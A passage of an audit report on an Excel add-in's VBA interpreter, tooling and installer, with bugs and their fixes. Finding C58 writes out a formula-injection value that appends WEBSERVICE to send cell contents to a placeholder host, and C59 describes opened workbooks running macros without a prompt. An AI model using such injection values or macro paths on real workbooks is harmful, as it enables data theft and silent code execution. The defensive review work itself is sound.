- Dedupe: I grepped BETA_REARVIEW/2 and OPTIMIZATION.md for "memo" combined with "guard"/"seconds". The memo is discussed for refusals (a refusal is never memoized, the size refusal is the exception, BETA_REARVIEW 22298-22305) and for the key's cost (OPTIMIZATION.md 1318). Nothing covers memoizing a machine-dependent outcome. Not filed.
- Fix direction: skip MemoPut when the item-9 stats say the search outcome was OPT_SEARCH_GUARD (`result.Item(9)(6) = 4`). A guard stop is as cheap to recompute as it was to find, and it is the only outcome that is not a function of the key.
- Ratchet-able?: a pure pin is enough. Pass guardSeconds through a test seam (or set effort huge and guard tiny), run twice, and require OptimizeMemoRuns to move by 2. A static rule cannot see this.

### C50 — A literal count past the Long range crashes with a raw "Overflow"; the Table-count and effort paths guard against this, the literal path does not

*medium · confirmed by reading · OPTIMIZE, slice finding 2*

- Class: 5 (numeric) and 10 (duplicated validation that has drifted); SD-2 (the refusal does not go through the message catalogue). Severity: medium (a raw VBA error in the cell; it only triggers on an unusual input). Verdict: CONFIRMED.
- Where: src/VLA_Optimize.bas:2302-2317 (CheckChoiceCount has no upper bound), 3463 (GroundOneChoice), 3061 (UniformLiteralCap); also 2252/2257/2314/2330 (CDbl on digit strings with no length guard).
- Evidence:
```vba
' CheckChoiceCount - digits and >= 0, nothing more
    If Not IsWholeNumberText(s) Then ...
    If CDbl(s) < 0 Then ...
' GroundOneChoice
            litCount(j) = CLng(OptAtomText(cr))          ' Overflow past 2,147,483,647
' compare WholeCountOf (the same count read from a Table):
        If Len(s) > 10 Then Exit Function
        If CDbl(s) > 2147483647# Then Exit Function
' and CheckEffortForm (optimize-effort-too-large):
        If CDbl(w) > 2147483647# Then VLA_Messages.RaiseMsg "optimize-effort-too-large", ...
```
- Failure scenario: `(choose-at-most 3000000000 (assign S P) (Eligible S P) (per (Shifts S)))`, for example a typo or a pasted cell total. It passes shape checking and pass 1. It then dies in GroundOneChoice with error 6, and the cell reads `#OPTIMIZE! Overflow`: no message id, no form named, no sentence (SD-5). A count or effort of 309 or more digits dies even earlier, inside the validators' own `CDbl(s)` / `CDbl(w)`, also as a raw "Overflow". The effort path was fixed for exactly this in OPTIMIZE.3 and the Table-count path (WholeCountOf) was guarded, but the literal count, the most direct spelling, was missed.
- Live repro: `=OPTIMIZE("(fact (Pool a)) (choose-at-most 3000000000 (pick X) (Pool X)) (query pick)")`. The same failure can be pinned pure through OptimizeRun.
- Dedupe: I grepped the roadmaps for optimize-count-*, "too-large", "Overflow" and "Long range". Only optimize-effort-too-large and the size ceilings appear. Not filed.
- Fix direction: give CheckChoiceCount (and CheckBetweenOrder) the same `Len(s) > 10` then `> 2147483647` guard WholeCountOf uses, raising optimize-count-not-a-number or a new optimize-count-too-large. Better, have all three sites call one `WholeCountText(s, n) As Boolean` helper so the literal, Table and effort paths cannot drift again. That helper should use Val rather than CDbl, per INTRINSICS #2.
- Ratchet-able?: partly. A grep in the check_* style for `CLng(OptAtomText(` / `CDbl(` on text inside VLA_Optimize.bas outside the one helper would hold the class.

### C51 — The command's formula splitter mis-reads Excel's `'` escape inside a structured reference and refuses a valid formula

*medium · confirmed by reading · OPTIMIZE, slice finding 3*

- Class: 10 (hand-rolled parser) / robustness. Severity: medium by the rubric (a wrong refusal), but the trigger is narrow. Verdict: CONFIRMED by trace. OptimizeCallArgs is pure and a pin can reproduce it without Excel.
- Where: src/VLA_Optimize.bas:770-783 (OptimizeCallArgs).
- Evidence:
```vba
        ElseIf inName Then
            If ch = "'" Then ... inName = False ...
        Else
            Select Case ch
            Case "'"
                inName = True          ' taken as a quoted SHEET name at any depth
```
  In a structured reference Excel escapes `[`, `]`, `#` and `'` in a column header with a single `'`. A roster header "Shift #" is written `Staff[[#All],[Shift '#]:[Name]]` and a header "Qty [h]" is written `T[Qty '[h']]`. The splitter treats each such `'` as the start of a quoted sheet name, even inside brackets.
- Failure scenario: `=OPTIMIZE(A1, Staff[[#All],[Shift '#]:[Name]])` works as a formula, since DATALOG supports column-scoped table arguments. When the formula refuses a large program for size and the user follows its advice to run it as a command (CommandPointerWords), the lone `'` opens a sheet-name state that never closes. That state swallows the `]]` and `)`, closeAt stays 0, and the command answers optimize-command-no-formula with "its formula, ..., does not close its call". With the paired `'[...']` escape, the second quote closes the state early, the extra `]` meets depth 0, and the same refusal follows. The command is the only way to run that program.
- Live repro: a Table with a header "Shift #", a formula over a column range of it, then Frazaro > Logic Engines > Optimize Selected Cell. Pure: `OptimizeCallArgs("=OPTIMIZE(A1,T[[#All],[Shift '#]])", fn, why)` returns Nothing.
- Dedupe: the existing pins (VLA_Tests_Query.bas 5857-5890) cover quoted sheet names, nested calls and `People[[#All],[Name]]`, but no escaped header. I grepped the roadmaps for "escape", "structured" and "OptimizeCallArgs" alongside OPTIMIZE/command and found nothing. Not filed.
- Fix direction: when depth > 0 and the current bracket is `[`, treat `'` as "escape the next character" (skip i + 1) rather than as a sheet-name quote. Only enter the sheet-name state at depth 0 or inside `(`/`{`. Add the two header shapes to the pin.
- Ratchet-able?: no, but two pins would close it.

### C52 — Event registrations disappear silently: when a close is cancelled, and after the workbook is reopened. Handler failures go to Debug.Print only.

*medium · confirmed in code, live effect needs repro · Host, IDE and build, slice finding 4*

- Class: 1 / 9 / SD-2. Severity: medium (the feature silently stops working, and the user gets no message). Verdict: CONFIRMED in code. The BeforeClose ordering is PLAUSIBLE until seen live, but it is standard Excel behaviour.
- Where: src/VLA_EventSink.cls:49-50. src/VLA_Events.bas:142 and :220 (the Debug.Print). src/VLA_Events.bas:243 (a click on an unregistered button does nothing). src/VLA_Interpreter.bas:2332 (the button's `OnAction` points at the add-in's own file name).
- Evidence:
```vba
Private Sub mApp_WorkbookBeforeClose(ByVal Wb As Workbook, Cancel As Boolean)
    VLA_Events.VlaUnregisterHandlers Wb       ' runs BEFORE Excel's "Save changes?" prompt
End Sub
...
Debug.Print "VLA-Events: on:sheet-change handler failed - " & Err.Description
```
- Failure scenario: (a) The user clicks X on a dirty workbook. BeforeClose unregisters every handler, then Excel asks "Save changes?". The user clicks Cancel and keeps working. Sheet-change handlers and every drawn button now do nothing, with no message. Another add-in's BeforeClose setting `Cancel = True` has the same effect. (b) The registry lives only in memory, but `make-button` draws a real button that is saved with the workbook. After save and reopen, or on a colleague's machine, clicking it does nothing ("a provable no-op" by design), with no hint that the program has to be interpreted again. If the colleague's add-in file has a different name (Frazaro_Espanol.xlam, Frazaro_Beta.xlam), Excel's raw "Cannot run the macro 'Frazaro_English.xlam'!..." appears instead. (c) A handler that raises is reported only to the Immediate window, which a user of the locked, shipped add-in cannot see. This breaks SD-2 (the refusal goes through no catalogue id) and SD-5 (no row is named).
- Live repro: (a) Arm a `Show "x".` sheet-change handler, dirty the workbook, press X, press Cancel, then edit a cell: no MsgBox. (c) Use a handler with `Put 1 in cell Q0.`, edit a cell: nothing is shown.
- Dedupe: Grepped for `BeforeClose`, `re-arm`, `reopen`, `provable no-op`. IN.7's text covers the close-time unregistration as intended behaviour. Neither the cancelled-close case nor the silent failure is filed.
- Fix direction: Unregister from `WorkbookDeactivate` plus an `Application.OnTime` check that the workbook has really gone, or check `wb.Name` liveness lazily at dispatch and drop dead entries there. Surface handler failures through a catalogue id: a StatusBar note, or a one-time VlaShowError per handler per session. When a button is clicked and no handler is registered, say "interpret this program again to arm its buttons" instead of doing nothing.
- Ratchet-able?: A check could forbid `Debug.Print` as the only reporting inside `VLA_Events` dispatch handlers.

### C53 — Auto-load registration matches OPEN slots by exact string and leaves gaps when it deletes

*medium · plausible, needs live repro · Host, IDE and build, slice finding 6*

- Class: 10 / robustness. Severity: medium. Verdict: PLAUSIBLE (depends on how Excel writes OPEN values and reads the sequence; needs a live check).
- Where: src/VLA_IDE.bas:3914 `VlaRegisterForAutoLoad`, :3932. src/VLA_IDE.bas:3948 `VlaUnregisterAutoLoad`, :3963-3964. The same logic is copied into installer/Frazaro.iss:117-161.
- Evidence:
```vba
ElseIf existing = targetPath Then          ' binary, unquoted compare
...
If existing = targetPath Then
    sh.RegDelete slot                      ' leaves OPEN, (gap), OPEN2 ...
```
- Failure scenario: Excel's own Add-ins dialog (untick then tick again, or "Browse") rewrites the OPEN values in its own form: the path in double quotes, sometimes with a `/R ` prefix. After that, (a) Register writes a second slot with the same path, and (b) Uninstall's exact compare matches nothing, so the OPEN entry survives while `ScheduleSelfDelete` removes the file. Every later Excel start then says "Sorry, we couldn't find ...Frazaro_English.xlam". If Frazaro sat in OPEN1 of OPEN..OPEN2, deleting OPEN1 leaves a gap. Excel is widely reported to stop reading at the first missing OPENn, which would silently stop another vendor's add-in in OPEN2 from loading. Case differences (`c:\` against `C:\`) also fail the compare.
- Live repro: Install, then File > Options > Add-ins > Go, untick Frazaro, OK, tick it again, OK, and close Excel. Inspect `HKCU\...\Excel\Options\OPEN*` for quoting. Run Uninstall Frazaro, restart Excel, and watch for the "couldn't find" dialog. For the gap: register a dummy add-in after Frazaro, uninstall Frazaro, restart, and check whether the dummy still loads.
- Dedupe: Grepped for `OPEN slot`, `OPENn`, `OPEN1`, `renumber`, `quoted`. DEPLOY.md describes the mechanism. Nothing covers quoting or gaps.
- Fix direction: Normalise before comparing: strip a `/R ` prefix and surrounding quotes, then compare with `StrComp(..., vbTextCompare)`. On delete, move the later slots down to keep the sequence unbroken. Fix VLA_IDE and Frazaro.iss in the same edit (one rule, two copies).
- Ratchet-able?: A parity check (two copies of one rule) could diff the compare expression in the .iss against the VBA.

#### Independent second account (Tooling and supply chain, slice finding 6)

- Class: installer robustness / uninstall leftovers. Severity: **medium** (after uninstall, every Excel start shows "Sorry, we couldn't find ...\Frazaro.xlam"). Verdict: **PLAUSIBLE** (Excel's rewrite behaviour needs a live repro).
- Where: installer/Frazaro.iss:156-159 (and the register twin :132-135); src/VLA_IDE.bas:3948-3966 (`VlaUnregisterAutoLoad`, a copy of the same logic)
- Evidence:
```pascal
if RegQueryStringValue(HKCU, OptKey, OpenSlotName(I), Existing) then
  if Existing = XlamPath then
    RegDeleteValue(HKCU, OptKey, OpenSlotName(I));
```
  The installer writes the path bare. When the user toggles the add-in in File > Options > Add-ins, Excel owns the OPEN/OPENn values and rewrites them on exit. Excel commonly stores a user add-in path in double quotes, especially when it contains a space (`C:\Users\John Smith\AppData\Roaming\Frazaro\Frazaro.xlam` becomes `"C:\Users\John Smith\..."`), and may renumber slots. Case differences have the same effect.
- Failure scenario:
  1. The user's profile path contains a space.
  2. They untick and re-tick Frazaro once (DEPLOY.md's own "Update loop" tells them to).
  3. Excel rewrites the slot quoted.
  4. The uninstaller, or the in-product "Uninstall Frazaro" button, compares `"...xlam"` with `...xlam`. No match, nothing deleted, while `[UninstallDelete]` removes the file.
  5. Excel then raises a missing-add-in error at every launch.
  - Secondary: deleting slot `OPEN` while `OPEN1` (another vendor's add-in) remains leaves a gap. Whether Excel stops enumerating at the first gap needs checking live. If it does, uninstalling Frazaro unloads someone else's add-in.
  - Tertiary: on a machine where Excel has never written `Excel\Options`, `GetOfficeExcelVersions` returns nothing. Registration silently does nothing while POST_INSTALL.txt says "Frazaro is installed and registered with Excel."
- Live repro: install to a profile with a space in the path, open Excel, untick and re-tick Frazaro in the Add-ins dialog, close Excel, and inspect `HKCU\Software\Microsoft\Office\16.0\Excel\Options` (quoted?). Then uninstall and relaunch Excel. For the gap question: register a dummy add-in in OPEN1, uninstall Frazaro from OPEN, relaunch, and check `Application.AddIns`.
- Dedupe: grepped both roadmaps for `OPEN`, `quot`, `UninstallDelete`. BETA_REARVIEW.md:2080-2084 (SIG.1 write-up, "none minted") notes that the consent records under `HKCU\Software\VB and VBA Program Settings\Frazaro` survive uninstall. That is a different leftover and was also never filed. DEPLOY.md:103-110 records a live install → uninstall run that did not toggle the add-in in between. Not filed.
- Fix direction: normalise before comparing in both copies: strip surrounding quotes and a leading `/R `, then compare case-insensitively. Compact the OPEN slots after a delete. Have `[UninstallDelete]` or `[Registry]` with `uninsdeletekey` also remove `HKCU\Software\VB and VBA Program Settings\Frazaro`.
- Ratchet-able?: a small parity check that Frazaro.iss's Register/Unregister and VLA_IDE's twins apply the same normalisation. Otherwise live-test only.

### C54 — The check-count floor is stale (28 of 29), and CI and release.ps1 apply no floor at all

*medium · confirmed by reading · Tooling and supply chain, slice finding 1*

- Class: ratchet that can pass vacuously / gate not enforced where it matters. Severity: **medium**. Verdict: **CONFIRMED by mutation**.
- Where: tools/run_checks.ps1:60-61, :172; .github/workflows/checks.yml:22-30; tools/release.ps1:120-126
- Evidence:
```powershell
# run_checks.ps1
$expectedAtLeast = 28
if ($Floor -gt 0) { $expectedAtLeast = $Floor }
...
$short = ($Filter -eq '') -and ($total -lt $expectedAtLeast)
# checks.yml and release.ps1 (step 5): the same glob, with no count compared against anything
foreach ($chk in Get-ChildItem tools -Filter 'check_*.ps1' | Sort-Object Name) { ... }
```
  `ls tools/check_*.ps1 | wc -l` returns 29. The 29th check, `check_no_vba_advice.ps1`, arrived in 729071f (2026-09-26, SOP.6), and the floor was not raised. The last floor bump was 155056d (2026-09-25).
- Failure scenario (reproduced): in the copy, `rm tools/check_sec9_phrasebook_gate.ps1` (the ratchet behind SEC.9, an open and severe item), then run `run_checks.ps1`. Result: `=== 28 checks: 28 passed, 0 failed === ALL GREEN.`, exit 0. CI and `release.ps1 -DryRun` would also go green, because they only iterate whatever the glob finds. The runner's header says the floor exists to catch exactly this case ("A check that is deleted, renamed out of the glob ... does not fail - it simply stops running"), but only the local runner has it, and it is one behind.
- Three smaller holes in the same runner:
  - `-Filter xyz` that matches nothing prints `0 check(s) ... 0 passed, 0 failed` and then `ALL GREEN.`, exit 0.
  - `-Floor N` can *lower* the floor (for example `-Floor 1`), although the header calls lowering it "a deliberate, reviewed act".
  - CI and release.ps1 never run the `-WithExtras` mutation controls (`check_optimize_search_discipline.ps1 -Control` and others), so the "mutation-tested" claims are enforced nowhere automatically.
- Live repro: not needed (host-independent). Same experiment on Windows: `Rename-Item tools\check_sec9_phrasebook_gate.ps1 x.ps1; powershell -File tools\run_checks.ps1`.
- Dedupe: grepped both roadmaps for `expectedAtLeast`, `the floor`, `run_checks`. Only DATALOG.14's "run_checks.ps1 runs all 27 checks ... born here" matches. Not filed.
- Fix direction: move the floor into one data file, for example `tools/check_floor.txt`, read by run_checks.ps1, checks.yml and release.ps1 (or have CI and release call run_checks.ps1). Better still, make it an exact expected set of names, not a count, so a delete-one-add-one swap also fails. Refuse a filtered run that matches 0 checks, and refuse `-Floor` below the file value.
- Ratchet-able?: yes. A self-check that the expected-names list equals the glob in both directions ends the drift permanently.

### C55 — check_id_registry.ps1 reports "clean" when the governed file set is empty

*medium · confirmed by reading · Tooling and supply chain, slice finding 2*

- Class: ratchet that can pass vacuously. Severity: **medium** (SD-9's never-reuse guarantee silently switches off). Verdict: **CONFIRMED by mutation**.
- Where: tools/check_id_registry.ps1:41-46, :293-301
- Evidence:
```powershell
$governedPaths = @(Get-ChildItem -Path $docsDir -Filter 'BETA_ROADMAP*.md') +
                  @(Get-ChildItem -Path $docsDir -Filter 'ALPHA*_ROADMAP.md') | Sort-Object Name
...
$issues = $collisions.Count + $dups.Count + $retiredHits
exit ([Math]::Min($issues, 1))
```
  There is no assertion that `$governedPaths.Count -gt 0`, and no floor on the number of IDs parsed. No `ALPHA*_ROADMAP.md` exists today, so the two BETA files are the whole governed set.
- Failure scenario (reproduced): rename `docs/BETA_REARVIEW.md` to `ROADMAP_B1.md` and `docs/BETA_ROADMAP.md` to `ROADMAP_B2.md` (the kind of rename the EDITION-MANIFEST moves already did to phrasebooks). Output shrinks from 523 lines to 32, with an empty high-water table, and ends `=== CHECK: clean - 0 governed collisions ... ===`, exit 0. The same applies if the roadmap moves to a subfolder. The header already records one silent hole in this script (the `{1,4}` prefix cap). This is the same shape one level up.
- Live repro: not needed.
- Dedupe: grepped both roadmaps for `ALPHA*_ROADMAP` and `governed set`. Only BETA_REARVIEW.md:3671 describes the set. Not filed.
- Fix direction: fail when `$governedPaths.Count -eq 0` or when the parsed-definition count drops below a held floor, for example the current count minus a margin.
- Ratchet-able?: yes, as a class. See "Recurring patterns" below: add `if (<inputs>.Count -eq 0) { Write-Error ... }` after every discovery glob.

### C56 — The generated english_expanded.vla is trusted by header stamp only: truncate its body and two ratchets pass

*medium · confirmed by reading · Tooling and supply chain, slice finding 3*

- Class: ratchet that can pass vacuously. Severity: **medium**. `check_grammar_since.ps1` is what keeps F.10's `(requires-version ...)` dates honest. Verdict: **CONFIRMED by mutation**.
- Where: tools/check_rule_coverage.ps1:76-95 and the staleness gate from :97; tools/check_grammar_since.ps1:115-116, :153-163
- Evidence: the staleness gate compares the artifact's line-2 `source-hash:` stamp with a fresh hash of `english.vla`. It never checks that the artifact's *body* is the expansion of that source. `check_grammar_since` then takes its "live" rule inventory from `check_rule_coverage.ps1 -ListRules` and only fails on `$undated -gt $AllowedUndated`.
- Failure scenario (reproduced): `head -3 scripts/polyglotta/english_expanded.vla > tmp && mv tmp ...`. That keeps the two header lines, so the stamp still matches english.vla.
  - `check_rule_coverage.ps1` then prints `SUMMARY: 0/0 rules have 2+ tests; 0 have exactly one; 0 have zero` and exits 0.
  - `check_grammar_since.ps1` prints `CHECK: clean - every live phrase rule and dispatch arm carries a since-date` and exits 0. All 223 ledger rows are listed only as informational "rows with no live form".
  - The same blind spot catches a subtler real case: a G-EXPANDER bug that drops or mangles some rules on export while stamping the correct source hash. The coverage report and the since-ledger would both shrink silently.
- Live repro: not needed.
- Dedupe: grepped roadmaps for `english_expanded`, `artifact`, `truncat`. The staleness gate is described as "refuse loudly rather than report on stale input", but no item covers body-versus-stamp integrity. Not filed.
- Fix direction: pick one or more.
  - Stamp a hash of the artifact body too, or a rule count, and verify it.
  - Have `check_rule_coverage` count `(english-vla` forms in the *source* and refuse if the artifact holds fewer expanded rules than the source has rules.
  - Have `check_grammar_since` fail when the live inventory is empty or smaller than a held floor.
- Ratchet-able?: yes (same empty-input guard as finding 2).

### C57 — release.ps1 publishes even when `git fetch` or `git push origin main` fails

*medium · confirmed by reading · Tooling and supply chain, slice finding 5*

- Class: error handling (native exit codes ignored). Severity: **medium** (a public tag and release pointing at commits not on main). Verdict: **CONFIRMED by reading**.
- Where: tools/release.ps1:72, :185-189
- Evidence:
```powershell
git fetch -q origin                      # exit code never read
...
git push origin main                     # exit code never read
git tag -a $tag -m "Frazaro $Version"    # exit code never read
git push origin $tag                     # exit code never read
& gh release create $tag @assets ...     # the ONLY $LASTEXITCODE check
```
  `$ErrorActionPreference = 'Stop'` does not stop on a native command's non-zero exit in Windows PowerShell 5.1.
- Failure scenario:
  - Someone merges a PR to main (CI exists for exactly that) between preflight and push, or the preflight `git fetch` failed offline so `origin/main` was stale and the "behind" check compared against old data.
  - `git push origin main` is rejected as non-fast-forward. The script continues: it creates the annotated tag on the local HEAD, pushes the tag (tags are not fast-forward-checked), and `gh release create` publishes a GitHub release with the three assets on a tag whose commit is not on main.
  - The final message even says "tag and main are pushed" on the one path it does check.
- Dedupe: grepped for `git push origin main` and `release.ps1` in both roadmaps. Nothing filed.
- Fix direction: after each git call, `if ($LASTEXITCODE -ne 0) { Write-Host ...; exit 1 }`. Treat a failed fetch as a preflight failure. Better: `git push --atomic origin main $tag` after tagging locally, so main and the tag land together or not at all.
- Ratchet-able?: partly. A scan of tools/*.ps1 for a native `git`/`gh`/`ISCC` call not followed within 1-2 lines by `$LASTEXITCODE` would catch the class.

### C58 ✔ — `interpolate` splices slot values into =DATALOG formulas raw; the phrasebook's "the macro doubles the quotes" claim is false

*medium · confirmed by reading · Tooling and supply chain, slice finding 7* · *re-read by the assembling session*

**Roadmap link:** Extends SEC.15; also a phrasebook-author trap, since the comment at english.vla:4275 says the opposite.

**Related:** C6

- Class: security (formula injection) / numeric locale. Severity: **medium**. Verdict: **CONFIRMED** on the code path (template to EvalInterpolateCall). The resulting formula needs a live check.
- Where: scripts/polyglotta/english.vla:4273-4276 (the claim), :4286-4302 (`datalog-chain-place`), :4222-4240 (`datalog-filter-place`), :4402-4414 (`prolog-ask-place`); src/VLA_Interpreter.bas:4297 (and its emitter twin, `VLA.bas` EmitExpr `Case "interpolate"`)
- Evidence:
```lisp
; ... the macro below doubles them itself; a phrasebook author never has to.
(interpolate "=DATALOG(\"(rule (vlachain X Y) ({table} X Y)) ... (vlachain X \"\"{person}\"\")) (query {alias})\", {table})"
```
```vba
            result = result & valArr(idx)   ' VLA_Interpreter.bas:4297 - no escaping of any kind
```
  The macro only *surrounds* `{person}` with doubled quotes. It never doubles a `"` inside the value. `{person:expr}` and `{val:expr}` are `:expr` slots, so they accept a variable whose value comes from a cell at run time. The comment says the anchor "MUST be quoted", but nothing enforces a literal.
- Failure scenario:
  - `Set boss to value of cell A1.` followed by `Show everyone who reports to boss directly or not in Reports as team in cell E2.`
  - If A1 holds `Al"ice`, the written formula is malformed: a raw Excel error at `set-formula`.
  - If A1 is crafted, for example `x"")) (query t)",reports)&WEBSERVICE("http://h/"&B1)&DATALOG("(query t`, the value closes the DATALOG string and appends arbitrary worksheet functions to a live formula Frazaro wrote. That is the class-7 "formula written with user text" injection, and it reaches the network with no Frazaro code involved (SD-13).
  - For `{val}` in `datalog-filter-place`, a Double goes through `&`, a locale-dependent CStr. `80000.5` becomes `80000,5` on a comma-decimal machine, which DATALOG reads as two tokens. That part extends EN.* locale, not new.
- Live repro: in Excel, put `x""` in A1, run the two sentences above, and read E2's `.Formula`. Then try a value that closes the string and appends `&1`, and check that the cell evaluates the appended part.
- Dedupe: grepped for `interpolate` and `escap` (BETA_REARVIEW.md:9543-9566 L-INTERPOLATE: its refusals cover template-must-be-literal, unknown key and unused argument, with no escaping) and for `person` (BETA_REARVIEW.md:8190 is about case folding only). Not filed. The numeric-locale half: extends EN.*.
- Fix direction: give interpolate an escaping hole form, for example `{person:fq}`, that doubles `"` (formula-string escaping) and renders numbers with `Str$`/invariant formatting. Alternatively make `datalog-*-place` take `:text` quoted literals only. Fix the false comment either way.
- Ratchet-able?: yes. Scan `scripts/**/*.vla` for `(interpolate "=` (a formula template) whose holes sit inside `\"`-delimited regions without an escaping marker.

### C59 — check_word_automation_security.ps1 covers Word only; the interpreter's Excel `Workbooks.Open` runs the target's macros at the programmatic default

*medium · plausible, needs live repro · Tooling and supply chain, slice finding 8*

**Roadmap link:** Extends SEC.7 (external-effect verbs not permissioned): the missing piece is the opened file's own macros.

- Class: ratchet blind spot / security. Severity: **medium**. Could be high if confirmed that MOTW-blocked targets still run. Verdict: **PLAUSIBLE**.
- Where: tools/check_word_automation_security.ps1:64-66; src/VLA_Interpreter.bas:3118-3120; src/VLA_IDE.bas:1771 (dev-only `EnglishIdeExportSkeleton`)
- Evidence:
```powershell
$openPattern  = 'Documents\s*\.\s*Open'
$guardPattern = 'AutomationSecurity\s*=\s*3\b'   # receiver not checked
```
```vba
            Case "open"
                VLA_Provenance.VlaProvenanceGuardCaptured "open a workbook"
                obj.Open ArgAt(argVals, 0): Exit Sub
```
  `grep AutomationSecurity src/*.bas` finds only VLA_IDE.bas:4662 (Word). Excel's `Application.AutomationSecurity` defaults to `msoAutomationSecurityLow` for workbooks opened by code, so a `Workbook_Open` handler in the opened file runs without the macro prompt. SEC.8's guard checks the provenance of the *host* that carried the program, not of the file being opened.
- Failure scenario: a local, unmarked workbook runs `Open workbook "C:\Users\me\Downloads\q3.xlsm".` The target was downloaded, and its `Workbook_Open` runs silently under Frazaro's call, bypassing the Enable Content bar the user would see opening it by hand.
  - Also, the ratchet's receiver-agnostic guard regex is satisfied by `Application.AutomationSecurity = 3` (Excel's own), which does not protect a Word instance. And it cannot see `With wd.Documents` / `.Open` or `Set d = wd.Documents: d.Open`.
- Live repro: create `t.xlsm` with `Private Sub Workbook_Open(): MsgBox "ran": End Sub`, mark it with a Zone.Identifier (ZoneId=3), then run an interpreted `open workbook` sentence on it from an unmarked local host. Does "ran" appear? Also check whether Microsoft's internet-macro block still stops it, which would lower the severity.
- Dedupe: SEC.13 (BETA_ROADMAP.md:129) is Word-only by title and fix. SEC.8 (:124) gates host provenance. Grepped for `Workbooks.Open`, `Workbook_Open`, `AutomationSecurity`. No Excel item exists.
- Fix direction: wrap the interpreter's `open` in save, set `Application.AutomationSecurity = 3`, open, restore (restore on the error path too). Widen the ratchet to `(Documents|Workbooks|Presentations)\s*\.\s*Open` and to `.Open` inside `With ...Documents|Workbooks`. Require the guard's receiver to match the open's receiver.
- Ratchet-able?: yes, by extending the existing ratchet as above.

### C60 — Action names from the previous program leak through EnglishResetGrammar and delete the next phrasebook's function words

*low-medium · confirmed by reading · Translator, slice finding 9*

- Class: global mutable state (9). Severity: **low-medium** (intermittent; it works on the second Check). Verdict: **CONFIRMED**.
- Where: `src/VLA_SentenceEngine.bas:861-870` (EnglishToVla's cleanup loop), `:9746-9786` (EnglishResetGrammar, which rebuilds mFnOf/mFnNullary via RegisterBuiltinFuncWords but never clears `mUserFnWords`), `:1011/:1087` (where the names are added).
- Evidence:
```vba
If Not mUserFnWords Is Nothing Then
    For Each ufw In mUserFnWords
        On Error Resume Next
        mFnOf.Remove CStr(ufw)          ' removes from BOTH tables,
        mFnNullary.Remove CStr(ufw)     ' whoever owns the entry now
        On Error GoTo 0
    Next
End If
Set mUserFnWords = New Collection
```
- Failure scenario: program A (workbook 1, base phrasebook) defines `To get area:`, so `area` is added to mUserFnWords. Next, workbook 2's Check does EnglishResetGrammar and then loads a phrasebook with `(english-function "area of" vlaarea)`. EnglishToVla(B) starts by removing `area` from mFnOf, which deletes the phrasebook's word. B's `Set a to area of 5.` then misparses or refuses. The next Check works, because mUserFnWords is empty by then. `On Error Resume Next` hides the fact that the removed entry belonged to someone else.
- Live repro: in one Excel session, Check a program with `To get area: Give back 1.`, then Check another program that relies on a phrasebook `area of` function word. Compare the first and second Check.
- Dedupe: mUserFnWords is not mentioned in either roadmap.
- Fix direction: clear mUserFnWords in EnglishResetGrammar. Better, keep program-defined function words in their own overlay collection that ParsePrimCore consults first, so nothing has to be removed from the shared table.
- Ratchet-able?: this is the "per-translation state reset in one entry point, not the others" class (see pattern B below). A check could require that every module Collection reset in EnglishToVla is also reset in EnglishResetGrammar, or is listed as intentionally session-scoped.

### C61 — A phrasebook macro silently overrides a prelude macro of the same name

*low-medium · confirmed by reading · Reader and emitter, slice finding 12*

- Class: 9/10 (supply chain; last definition wins) / **Severity: low-medium** (latent: the current `english.vla` and `prelude.vla` share no names, which I checked by diffing the 193 and 46 macro names) / Verdict: CONFIRMED by reading.
- Where: `src/VLA.bas:2602` (`Set mMacros.Item(Fold(mname)) = rec`, an overwrite). `src/VLA_SentenceEngine.bas:9176-9227`: `RegisterVocabMacro` checks collisions only against other vocabulary macros (`mVocabMacroNames`), and `VlaProbeMacroForm` deliberately runs without the prelude.
- Failure scenario: a community phrasebook defines `(defmacro (with-no-alerts …) …)` or `(cells-of …)`. Pass 1 collects the prelude first and the vocabulary later, so the phrasebook's version replaces the prelude's globally, including inside other prelude macros. Every sentence built on it changes meaning with no message. SEC.3 (per-layer provenance) would record it after the fact but does not refuse it.
- Dedupe: searched for "redefin", "shadow.*macro". BETA_REARVIEW:12982 describes the last-wins behaviour as a performance fact, not as a hazard.
- Fix direction: seed `mVocabMacroNames` with the prelude's macro names (tagged "prelude"), so the existing `english-vocab-macro-name-collision` fires.
- Ratchet-able?: yes. A test that loads each shipped phrasebook and asserts it has no name in common with the prelude.

### C62 — A Run restores only ScreenUpdating; StatusBar, Calculation and the program sheet's protection are left changed → U.29

*low-medium · confirmed by reading · Interpreter and runtime, slice finding 13*

- Class: 2 / Severity: **low-medium** / Verdict: **CONFIRMED**
- Where: `src/VLA_IDE.bas:1161-1210` and `1234-1246` (RunProgram), `1340-1391` (InterpretProgram).
- Evidence:
```vba
    ws.Protect                    ' prior protection state not read
    ...
    Application.ScreenUpdating = True
    ws.Unprotect                  ' unconditionally, on both exits
```
- Failure scenario: `Put "working" in status bar.` followed by a step that stops. The status bar keeps saying "working" for the rest of the Excel session, because StatusBar does not reset when a macro ends. The only English-reachable path is StatusBar. Hand VLA with `(set! application.calculation xlcalculationmanual)` (or with-fast-excel failing under F7) leaves all open workbooks in manual calculation, and Undo does not touch it. A user who protected their program sheet without a password finds it unprotected after every Run.
- Live repro: As written above.
- Dedupe: PF.2 is about performance bracketing for generated code, not about restoring what the program itself changed. Not filed.
- Fix direction: Save Application.StatusBar, Calculation, DisplayAlerts, EnableEvents and CutCopyMode, and `ProtectContents`, before the Run. Restore them on every exit of RunProgram, InterpretProgram and PutBackLastRun.
- Ratchet-able?: Yes. Any Sub that assigns `Application.<X> =` must assign it again in its error handler (a per-procedure grep pairing).

### C63 — Snapshots mishandle hidden sheets: a very-hidden target blocks the Run, a Hidden sheet comes back visible, and a restored sheet moves to the end of the tabs

*low-medium · confirmed by reading · Interpreter and runtime, slice finding 14*

**Related:** C18

- Class: 8 / Severity: **low-medium** (a Hidden sheet made visible can expose data) / Verdict: **CONFIRMED** by reading; the very-hidden Copy failure is documented in LESSONS V
- Where: `src/VLA_IDE.bas:3216` (Copy of the live sheet), `3525` (`cpy.Visible = xlSheetVisible`), `3515` (`snap.Copy After:=snap`).
- Failure scenario: The program names `sheet Config`, which the author keeps very-hidden. `Worksheets("Config").Copy` fails ("Excel cannot Copy a very-hidden sheet"), so every Run is refused with ide-undo-snapshot-failed. With Config merely Hidden, the snapshot works, but Undo or a stop makes it visible and puts it after the snapshots at the end of the tab strip.
- Live repro: Hide a sheet named in the program, Run, stop or Undo, and look at its visibility and tab position.
- Dedupe: Not filed. U.19–U.23 cover naming and cleanup only.
- Fix direction: Record `Visible` and tab index at snapshot time and restore both. For a very-hidden target, unhide it briefly to copy it, then re-hide it.
- Ratchet-able?: Host test only.

